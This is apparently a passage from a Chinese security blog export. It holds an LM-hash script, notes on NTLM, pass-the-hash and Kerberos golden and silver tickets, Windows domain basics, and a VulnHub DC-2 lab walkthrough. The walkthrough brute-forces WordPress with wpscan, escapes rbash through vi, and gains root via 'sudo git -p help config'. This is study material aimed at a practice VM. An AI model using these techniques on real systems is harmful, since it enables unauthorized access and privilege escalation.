+= j</span><br><span class="line">            value = long_to_bytes(<span class="built_in">int</span>(key, <span class="number">16</span>))</span><br><span class="line">            val = <span class="built_in">len</span>(value) % <span class="number">8</span></span><br><span class="line">            <span class="keyword">if</span> val != <span class="number">0</span>:</span><br><span class="line">                value += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">8</span> - val)</span><br><span class="line">            des = DES.new(key=value, mode=DES.MODE_ECB)</span><br><span class="line">            ans += des.encrypt(self.key).<span class="built_in">hex</span>()</span><br><span class="line">        <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(LM_hash(<span class="string">&#x27;hongrisec@2020&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>加密之后的结果为</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201210103024944.png" alt="image-20201210103024944"></p>
<p>使用<code>mimikatz</code>在Windows中查看<code>LM hash</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201210103058006.png" alt="image-20201210103058006"></p>
<h2 id="Windows网络认证"><a href="#Windows网络认证" class="headerlink" title="Windows网络认证"></a>Windows网络认证</h2><h3 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h3><p>NTLM协议的认证过程分为三步</p>
<ul>
<li>  协商</li>
<li>  质询</li>
<li>  验证</li>
</ul>
<h4 id="协商"><a href="#协商" class="headerlink" title="协商"></a>协商</h4><p>主要用于双方确认协议版本</p>
<h4 id="质询"><a href="#质询" class="headerlink" title="质询"></a>质询</h4><p>基于 <strong>挑战(chalenge)/相应(response)</strong> 认证机制</p>
<p>完整过程如下：</p>
<ol>
<li><p> <code>client</code>请求<code>server</code>的某资源，将<code>usernameA</code>发送</p>
</li>
<li><p><code>server</code>接收到<code>client</code>发送的<code>usernameA</code>，判断<code>usernameA</code>是否在本地账户列表<code>share_user</code>里</p>
<ul>
<li><p>  如果没有，认证失败</p>
</li>
<li><p>如果有，生成一个<code>Chalenge</code>（为16位的随机数），并且使用<code>usernameA</code>的<code>NTLM hash</code>加密<code>Chalenge</code>得到一个密文<code>Chalenge_encry</code>，并且将<code>Chalenge</code>发送给<code>client</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201210110356264.png" alt="image-20201210110356264"></p>
</li>
</ul>
</li>
<li><p> <code>client</code>接收到<code>Chalenge</code>，使用<code>usernameA</code>的<code>NTLM hash</code>加密得到<code>Chalenge_encry</code>并且将<code>Chalenge_encry</code>发送给<code>server</code></p>
</li>
<li><p><code>server</code>比较<code>client</code>发送的<code>Chalenge_encry</code>和自己的，相等，则认证通过</p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201210110408447.png" alt="image-20201210110408447"></p>
</li>
</ol>
<ul>
<li>  <code>Chalenge</code>为<code>server</code>产生的一个随机数，每次都不同</li>
</ul>
<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>质询完成之后，验证结果</p>
<h3 id="NTLM-v2协议"><a href="#NTLM-v2协议" class="headerlink" title="NTLM v2协议"></a>NTLM v2协议</h3><p>NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同</p>
<ul>
<li>  <strong>Challage</strong>:NTLM v1的Challenge有<strong>8位</strong>，NTLM v2的Challenge为<strong>16位</strong>。</li>
<li>  <strong>Net-NTLM Hash</strong>:NTLM v1的主要加密算法是<strong>DES</strong>，NTLM v2的主要加密算法是<strong>HMAC-MD5</strong>。</li>
</ul>
<h3 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass the hash"></a>pass the hash</h3><p>在上述认证过程中，如果本地有</p>
<ul>
<li>  在<code>share_user</code>中的一个用户名</li>
<li>  用户名的<code>HTLM hash</code></li>
</ul>
<p>那么就可以利用这个用户名和他的<code>hash</code>进行认证，而不需要输入密码</p>
]]></content>
      <categories>
        <category>intranet - windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title>windows kerberos协议</title>
    <url>//windows_kerberos.html</url>
    <content><![CDATA[<p>Windows下<code>kerberos</code>协议的相关认知</p>
<a id="more"></a>

<p>前几天被qax的师傅面试，问到了<code>kerberos</code>协议，<code>黄金白银票据</code>等，答不上来。</p>
<p>找了点资料，学习学习。</p>
<p>参考的资料会在本文最后列出。</p>
<h1 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h1><p><font color='red'>注1：以下代称并非真实名词，只是我为了好记，取得名字。</font></p>
<h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><p>在<strong>Windows域环境</strong>身份认证的时候会用到它</p>
<p>(有关域的知识请参见<a href="./net_base_1.html">另一篇文章</a>)</p>
<p><code>kerberos</code>协议认证的结果是<strong>双向的</strong>，A访问B时，不仅仅是B要确保A不是伪造的，A也要确保请求的资源B不是被伪造的</p>
<p>然而在身份验证的过程中，不能采取双方直接验证密码的形式（假如其中有一个是冒充的，就会被套到密码），所以<code>kerberos</code>采用了一个可信第三方来进行验证，这个可信第三方就是域控(<code>Domain Controler</code>)，称之为<code>KDC</code></p>
<h3 id="KDC"><a href="#KDC" class="headerlink" title="KDC"></a>KDC</h3><p>域主机存放着域内所有的账号和密码</p>
<p>通过KDC进行验证，可以减少域管理员的工作量（当发生用户信息变动的时候，不需要在每一台主机上都进行更新信息。</p>
<p>账号A访问资源B时，会先和KDC进行身份认证，确认A和KDC的身份，账号A请求KDC帮忙认证资源B，</p>
<h3 id="账户A和KDC之间的认证"><a href="#账户A和KDC之间的认证" class="headerlink" title="账户A和KDC之间的认证"></a>账户A和KDC之间的认证</h3><p>已知：只有 账户A和KDC知道账户A的密码，如何在不泄漏密码的情况下验证自己的身份。</p>
<p><code>kerberos</code>协议中的验证过程如下：</p>
<ol>
<li> 账号A把自己的密码通过hash函数转换成一把密钥，称之为<code>A_password_hash</code></li>
<li>用<code>A_password_hash</code>加密当前的时间戳，生成一个字符串。用<code>A_password_hash(date-time)</code>来表示<ul>
<li>为什么会选择使用时间戳来加密？<ul>
<li>  原因是<code>A_password_hash</code>可能被截获并重放，导致<strong>重放攻击</strong>，但是重放攻击的伪造过程需要时间，KDC会把解密得到的时间戳和当前时间做一个对比，如果相差过大，就判断是重放攻击。</li>
<li>  所以需要在域中同步所有机器的时间，如果机器时间不对，根据上述的过程，容易被截获后造成重放攻击。</li>
</ul>
</li>
</ul>
</li>
<li> 把上一步生成的字符串<code>A_password_hash(date-time)</code>加上<code>账号A的信息</code>以及<code>一段随机字符串</code>，发送给KDC。用<code>AS_REQ = &#123;A_password_hash(date-time), A_info, random_string&#125;</code>表示这个请求</li>
</ol>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/epub_729216_208.jpeg" alt="img"></p>
<blockquote>
<p>  上图来自《wireshark 网络分析就是这么简单》</p>
</blockquote>
<p>本次的<code>AS_REQ</code>发送的账户名是<code>linp1</code>，随机字符串是<code>136224786</code></p>
<p>​    上述过程的流程大致如下图所示：</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201205164502067.png" alt="image-20201205164502067"></p>
<ol start="4">
<li><p>KDC收到<code>AS_REQ</code>之后，先读到账号A的信息<code>linp1</code>，于是去查找A的密码，在用A的密码生成<code>A_password_hash</code>，如果能解密<code>A_password_hash(date-time)</code>则对账号A的验证通过（因为只有A知道自己的密码）</p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201207140843369.png" alt="image-20201207140843369"></p>
</li>
</ol>
<p>既然A已经向KDC证明了自己的身份，那就轮到KDC向A证明了。</p>
<ol start="5">
<li><p>KDC生成一个密钥<code>KDC_key</code>，作为账户A和KDC之间认证用（为了避免每一次都要进行繁琐的互相认证），KDC把自己的密码做成hash<code>KDC_password_hash</code>，用它加密<code>KDC_key</code>，得到一个<code>TGT</code></p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201207141622277.png" alt="image-20201207141622277"></p>
<p> <code>TGT = KDC_password_hash(A_info, KDC_key)</code></p>
</li>
<li><p>KDC向账户A返回一个<code>AS_REP</code>包</p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201207142419208.png" alt="image-20201207142419208"></p>
<p> <code>AS_REP = TGT, A_password_hash(KDC_key, date-time, random_string)</code></p>
</li>
<li><p>账户A接收到了<code>AS_REP</code>之后使用<code>A_password_hash()</code>解密<code>A_password_hash(KDC_key, date-time, random_string)</code>，通过验证<code>random_string</code>和<code>date-time</code>来确定KDC身份的真实性，如果是真实的，则把<code>KDC_key</code>和<code>TGT</code>保存起来备用。</p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208083725805.png" alt="image-20201208083725805"></p>
</li>
</ol>
<h3 id="A请KDC帮忙认证资源B"><a href="#A请KDC帮忙认证资源B" class="headerlink" title="A请KDC帮忙认证资源B"></a>A请KDC帮忙认证资源B</h3><ol>
<li><p>账户A将<code>TGT</code>交还KDC，还有<strong>账户A的相关信息，时间戳，资源B的相关信息</strong>，发送一个<code>TGS-REQ</code></p>
<p> <code>TGS-REQ = TGT, KDC_key(A_info, date-time), B_info</code></p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208103741964.png" alt="image-20201208103741964"></p>
</li>
<li><p>KDC得到<code>TGS-REQ</code>之后，将<code>TGT</code>解密得到<code>KDC_key</code>，用<code>KDC_key</code>解密出<code>A_info date-time</code>用于证明A的身份。</p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208104303690.png" alt="image-20201208104303690"></p>
</li>
<li><p>KDC 生成密钥<code>KDC_AB_key</code>，一份直接交给A，另一份通过A交给B。为了防止资源B是伪造的，KDC把资源B的密码hash成<code>B_password_hash</code>，用<code>B_password_hash</code>加密<code>KDC_AB_key</code>，做成一张只有B（除了KDC）能解密的票据(<code>Ticket</code>)</p>
<p> <code>Ticket=B_password_hash(A_info, KDC_AB_key)</code></p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208104754206.png" alt="image-20201208104754206"></p>
<p> 发送给账户A的回复<code>TGS_REP = KDC_key(KDC_AB_key), Ticket</code></p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208105932502.png" alt="image-20201208105932502"></p>
</li>
<li><p> 账户A收到<code>TGS_REP</code>，用<code>KDC_key</code>解密出<code>KDC_AB_key</code>，并且把<code>Ticket</code>留下，作为之后和资源B进行访问的时候的票据。降低了KDC的负担。</p>
</li>
</ol>
<h3 id="账户A和资源B相互认证"><a href="#账户A和资源B相互认证" class="headerlink" title="账户A和资源B相互认证"></a>账户A和资源B相互认证</h3><p>总结一下到目前为止账户A拥有的数据</p>
<ul>
<li>  <code>Ticket: B_password_hash(KDC_AB_key)</code></li>
<li>  <code>KDC_AB_key</code></li>
<li>  <code>KDC_A_key</code></li>
<li>  <code>TGT</code></li>
</ul>
<p>KDC拜托账户A转交给资源B的是<code>KDC_AB_key</code></p>
<ol>
<li><p>账户A给资源B发送<code>AP-REQ</code></p>
<p> <code>AP_REQ = KDC_AB_key(A_info, date-time), Ticket</code></p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208112041712.png" alt="image-20201208112041712"></p>
</li>
<li><p>资源B收到<code>AP-REQ</code>，使用自己的密码<code>B_password_hash</code>解开<code>Ticket</code>，得到<code>KDC_AB_key</code>，使用<code>KDC_AB_key</code>解密，得到<code>A_info, date-time</code>以此确认账户A的身份</p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208112801386.png" alt="image-20201208112801386"></p>
</li>
<li><p>资源B回复一个<code>AP-REP</code>，来向A证明自己的身份</p>
<p> <code>AP-REP = KDC_AB_key(date-time)</code></p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208113234301.png" alt="image-20201208113234301"></p>
</li>
<li><p>账户A使用<code>KDC_AB_key</code>解开<code>date-time</code>确认资源B的身份</p>
<p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208113212734.png" alt="image-20201208113212734"></p>
</li>
</ol>
<p>以后账户A和资源B通信使用<code>KDC_AB_key</code>加密流量，这个key<strong>只有KDC， 账户A， 资源B知道</strong>。</p>
<h2 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h2><p>在上述的验证过程中，如果知道一些内容，就可以导致票据传递攻击</p>
<ul>
<li>  白银票据——知道<code>B_password_hash</code></li>
<li>  黄金票据——知道<code>KDC_password_hash</code></li>
</ul>
<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>在上述<a href="#%E8%B4%A6%E6%88%B7A%E5%92%8C%E8%B5%84%E6%BA%90B%E7%9B%B8%E4%BA%92%E8%AE%A4%E8%AF%81">账户A和资源B相互认证</a>的过程中，如果账户A本身就有资源B密码的hash值<code>B_password_hash</code>那么就可以伪造一份<code>Ticket: B_password_hash(KDC_AB_key)</code></p>
<p>由于<code>KDC_AB_key</code>是KDC颁发，用于AB认证，那么账户A可以自己生成一个<code>KDC_AB_key(伪)</code>，然后使用<code>B_password_hash</code>加密这个伪造的key</p>
<p><code>B_password_hash(KDC_AB_key(伪))</code></p>
<p>在资源b认证的过程中，使用自己的密钥进行解密的时候，解密出来的key是<code>KDC_AB_key(伪)</code>，同时账户A发送的<code>KDC_AB_key(伪)(A_info, date-time)</code>会被B使用伪造的key成功解密，从而验证了A的身份，绕过了KDC的验证</p>
<p>特点：</p>
<ol>
<li> 不需要与KDC进行交互</li>
<li> 需要目标资源的hash</li>
</ol>
<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>如果在上述<a href="#%E8%B4%A6%E6%88%B7A%E5%92%8CKDC%E4%B9%8B%E9%97%B4%E7%9A%84%E8%AE%A4%E8%AF%81">账户A和KDC认证</a>时，拥有<code>krbtgt用户的hash</code>(<code>即KDC_password_hash</code>)</p>
<p>那么在认证的过程中可以使用<code>KDC_password_hash</code>生成一个假的<code>TGT</code>，跳过账户A和KDC认证，通过伪造的<code>TGT</code>和KDC进行交互，欺骗KDC，得到KDC的认证</p>
]]></content>
      <categories>
        <category>intranet - windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title>内网基础知识</title>
    <url>//net_base_1.html</url>
    <content><![CDATA[<p><code>《内网安全攻防》</code>读书笔记</p>
<p><code>1.1 内网基础知识</code></p>
<a id="more"></a>



<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="工作组-work-group"><a href="#工作组-work-group" class="headerlink" title="工作组(work group)"></a>工作组(work group)</h2><h3 id="工作组简介"><a href="#工作组简介" class="headerlink" title="工作组简介"></a>工作组简介</h3><p>在局域网中通过工作组的方式进行资源管理，是对内网资产的分类存放，便于访问资源</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/NtWI19C7UFvlxK4.png"></p>
<p>在工作组里，所有的计算机都是<strong>对等</strong>的地位，没有服务器和客户机的区别。</p>
<h3 id="加入工作组的方法"><a href="#加入工作组的方法" class="headerlink" title="加入工作组的方法"></a>加入工作组的方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我的电脑 -&gt; 属性 -&gt; 更改设置 -&gt; 更改 -&gt; （更改计算机名和工作组） -&gt; 重启</span><br></pre></td></tr></table></figure>



<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>缺乏<strong>集中管理与控制的机制</strong>，没有集中的统一账户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性的严密控制。只适合<strong>小规模</strong>的用户使用。</p>
<h2 id="域（Domain）"><a href="#域（Domain）" class="headerlink" title="域（Domain）"></a>域（Domain）</h2><h3 id="域介绍"><a href="#域介绍" class="headerlink" title="域介绍"></a>域介绍</h3><p>域是一个有<strong>安全边界</strong>的计算机的集合，比工作组有更加严格的安全管理控制机制，访问域中的资源必须以一个合法的用户登录到域中，权限取决于身份。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/timg?image&quality=80&size=b9999_10000&sec=1599556535041&di=bd5e7d530cdd628340d13493a79b2b13&imgtype=0&src=http%253A%252F%252Fpic4.zhimg.com%252Fv2-aaf3546c6df8d197100bf1dd5d8fc6c3_b.jpg" alt="img"></p>
<blockquote>
<p>安全边界：在两个域中，一个域中的用户不能访问到另一个域中的资源</p>
</blockquote>
<h3 id="域控制器（Domain-Controller）"><a href="#域控制器（Domain-Controller）" class="headerlink" title="域控制器（Domain Controller）"></a>域控制器（Domain Controller）</h3><p>类似门禁系统，控制域内的<strong>身份验证</strong></p>
<p>是整个域的<strong>通信枢纽</strong>，所有的权限身份认证都在域控上进行，也就是说<strong>所有的用户名和密码的hash值都存放在域控上</strong></p>
<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>为了避免DC瘫痪时，整个域内其他用户无法正常登录，保证域的正常使用，域内至少有两台域服务器，一台作为<code>DC</code>，另一台作为<code>备用DC</code></p>
<h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>如果所有的部门都放在同一个域内，信息交互所花费的时间会比较长，花费的代价大。</p>
<p>采用<code>父域和子域</code>，将每个部门/分公司 放入一个子域中，让子公司通过自己的域来管理自己的资源</p>
<blockquote>
<p>父域创建的域管理员登录不了子域的服务器，子域创建的域管理员登录不了父域服务器。</p>
<p>因为创建的域管理员并不在对方的数据库里面。</p>
<p>父域的本地管理员可以登录到子域服务器</p>
</blockquote>
<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>域树是多个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域。如果想要两个域之间互相访问，则需要建立信任关系。</p>
<blockquote>
<p>这些信任关系联合起来形成一棵树</p>
</blockquote>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/1561366-20191121161917242-744398688.png" alt="img"></p>
<p>在域树中，父域可以包含多个子域。子域是相对于父域来说的，指的是域名中的一个段。一个<code>.</code>表示一个层次。</p>
<h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>是多棵域树建立信任关系组成的集合。</p>
<p>可以通过域树之间建立的信任关系来管理和使用整个森林的资源，从而又保持了原有域的特性</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/NtWI19C7UFvlxK4-20200908145126473.png"></p>
<h4 id="域名服务器（DNS）"><a href="#域名服务器（DNS）" class="headerlink" title="域名服务器（DNS）"></a>域名服务器（DNS）</h4><p>实现<code>域名</code>和<code>ip地址</code>互相转换的服务器</p>
<p><strong>DNS服务器和域控制器通常配置在同一台机器上</strong></p>
<h4 id="活动目录（Active-Directory）"><a href="#活动目录（Active-Directory）" class="headerlink" title="活动目录（Active Directory）"></a>活动目录（Active Directory）</h4><p>域环境中提供<strong>目录服务的组件</strong></p>
<p>域树内的所有域共享一个活动目录</p>
<ul>
<li>账号集中管理</li>
<li>软件集中管理</li>
<li>环境集中管理</li>
<li>增强安全性</li>
<li>更可靠</li>
</ul>
<h4 id="安全域"><a href="#安全域" class="headerlink" title="安全域"></a>安全域</h4><p>将安全等级相同的计算机划入同一个网段，这些网段的计算机拥有相同的网络边界</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/1561366-20191121163434689-855209408.png" alt="img"></p>
<p>划分为三个区域：</p>
<ul>
<li>安全级别最高的**<code>内网</code>**<ul>
<li>可以分为<strong>办公区</strong>和<strong>核心区</strong></li>
</ul>
</li>
<li>安全级别中等的**<code>DMZ</code>**<ul>
<li>DMZ时对外提供服务的区域，因此可以从外部访问。</li>
</ul>
</li>
<li>安全级别最低的**<code>外网</code>**</li>
</ul>
<h4 id="访问控制策略"><a href="#访问控制策略" class="headerlink" title="访问控制策略"></a>访问控制策略</h4><ul>
<li>  内网可以访问外网。防火墙需要执行<code>NAT</code></li>
<li>  内网可以访问<code>DMZ</code></li>
<li>  外网不能访问内网。除非通过<code>VPN</code>接入</li>
<li>  外网可以访问<code>DMZ</code>，因为<code>DMZ</code>中的服务器需要对外服务</li>
<li>  <code>DMZ</code>不能访问内网，否则一旦<strong>DMZ沦陷</strong>，内网无法受到保护</li>
<li>  <code>DMZ</code>不能访问外网，如果配置了邮件服务器，那可以访问。</li>
</ul>
<h3 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h3><p>域内设置了多个<strong>安全组</strong>，域管理员将各个成员账户放入相应的安全组中，并为安全组配置访问权限，就相当于为安全组内所有的账户分配了权限。简化了域管理员的工作。</p>
<h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>主要用户授予本域内的资源访问权限</p>
<h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4>]]></content>
      <categories>
        <category>intranet</category>
      </categories>
      <tags>
        <tag>intranet</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub DC-2靶机</title>
    <url>//DC-2.html</url>
    <content><![CDATA[<p>vulnhub里的 DC-2 靶机</p>
<p>初学者难度</p>
<a id="more"></a>



<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a href="https://www.vulnhub.com/entry/dc-2,311/">vulnhub-DC2</a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>不知道为什么,下载完成之后并没有主动获得IP地址,而且网课接口名称也是对的.<br>后来将<code>桥接</code>改为<code>NAT</code>之后就可以了</p>
<h2 id="1-NMAP-扫描"><a href="#1-NMAP-扫描" class="headerlink" title="1. NMAP 扫描"></a>1. NMAP 扫描</h2><p>在<code>kali</code>机上查看ip地址<code>ifconfig</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;home&#x2F;kali&#x2F;vulnhub&#x2F;dc-2# ifconfig</span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.147.130  netmask 255.255.255.0  broadcast 192.168.147.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe2a:621f  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:2a:62:1f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 175293  bytes 110023189 (104.9 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 150846  bytes 13877594 (13.2 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>得到本机ip地址为<code>192.168.147.130</code>所以靶机的ip在<code>192.168.147.0/24</code>网段<br>使用<code>nmap</code>工具扫描网段,发现主机<br><code>nmap 192.168.147.0/24</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for dc-2 (192.168.147.131)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:7C:97:D6 (VMware)</span><br></pre></td></tr></table></figure>
<p>得到了靶机的ip地址为<code>192.168.147.131</code>,并且在0-1000端口只开启了<code>80端口(http)</code><br>进行更加深度的扫描<code>nmap -A 192.168.147.131</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586170890725-e1586177529774.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586170890725-e1586177529774.png"></a><br>是一个<code>WordPress</code>的模板</p>
<h2 id="2-访问网站"><a href="#2-访问网站" class="headerlink" title="2. 访问网站"></a>2. 访问网站</h2><h3 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h3><p>从上面扫描到的信息可以看到,想要访问网站,只能通过<code>http://dc-2</code>,因此需要修改<code>hosts</code>文件,将<code>http://dc-2</code>解析到<code>192.168.147.131</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172286546-e1586177580223.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172286546-300x74.png"></a><br>看到是一个<code>WordPress</code>和第一个<code>flag</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172400798-e1586177605680.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172400798-300x91.png"></a><br><code>flag</code>内容如下<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172423639.png" alt="file"></p>
<h3 id="爆破WordPress"><a href="#爆破WordPress" class="headerlink" title="爆破WordPress"></a>爆破WordPress</h3><p>通常的密码字典不一定管用,推荐了<a href="https://www.freebuf.com/articles/network/190128.html">cewl</a><br>根据链接的教程创建字典<br><code>cewl http://dc-2 -w dc2_password</code><br>有了密码字典还需要用户名啊,这里使用<a href="https://www.freebuf.com/sectool/174663.html">wpscan</a><br><code>wpscan --url http://dc-2 --enumerate u</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173208850-e1586177690710.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173208850-e1586177690710.png"></a></p>
<p>扫描出来三个用户名,使用<code>wpscan</code>进行爆破<br><code>wpscan --url http://dc-2 -U jerry(tom) -P dc2_password</code><br>Tom 和 Jerry 的密码都是可以爆出来的,admin不行<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173679186.png" alt="file"><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173729041.png" alt="file"><br>得到密码之后用Jerry的账户登录进入后台,得到第二个flag<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173819297.png" alt="file"></p>
<p>然后提示,用另外的登录口<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173840215.png" alt="file"></p>
<h2 id="另外的登录口"><a href="#另外的登录口" class="headerlink" title="另外的登录口"></a>另外的登录口</h2><p>看来是扫描不到位,错过了一些端口,<br><code>nmap -A 192.168.147.131 -p0-65535</code>,进行端口全扫描<br>扫出来一个<code>ssh</code>端口<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174130881-e1586177777434.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174130881-e1586177777434.png"></a><br>使用Tom的账号登录靶机<br><code>ssh tom@192.168.147.131 -p 7744</code><br>发现<code>cat</code>命令被屏蔽了<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174238395.png" alt="file"><br>查看一下<code>PATH</code>和<code>PATH</code>里面的命令<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174279706.png" alt="file"><br>用<code>vi flag*</code>得到第三个flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes</span><br></pre></td></tr></table></figure>
<h3 id="切换到jerry"><a href="#切换到jerry" class="headerlink" title="切换到jerry"></a>切换到jerry</h3><p>提示需要用Jerry的账户去提权,尝试切换到Jerry的账户<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174360078.png" alt="file"><br>what?没有su?在看了一眼,嗯?rbash?<a href="https://www.howtoing.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/">查找资料</a>,是一个受限的shell,这里屏蔽了<code>/</code>,知识受限,找资料,绕过rbash的办法<br>在<code>vi</code>里面创建一个shell (????)<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174741956.png" alt="file"><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174752874.png" alt="file"><br>得到shell之后,把环境变量加进去<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174807890.png" alt="file"><br>然后就可以切换账户了<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174875420-e1586177809142.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174875420-e1586177937925.png"></a><br>最后的提示是用<code>git</code>提权 (????)</p>
<p>先看看拥有root权限的指令<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175456005-e1586177847302.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175456005-e1586177925972.png"></a><br>git是不用root密码的,所以真的要用git提权<br>找资料<br><code>sudo git -p help config</code> 然后输入 <code>/bin/bash</code> 就可以得到root权限的shell,拿到最后一个flag<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175578057-e1586177903521.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175578057-e1586177903521.png"></a></p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub DC-3靶机</title>
    <url>//DC-3.html</url>
    <content><![CDATA[<p>vulnhub里的 DC-3 靶机</p>
<p>初学者难度</p>
<a id="more"></a>





<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a href="https://www.vulnhub.com/entry/dc-3,312/">vulnhub DC-3</a></p>
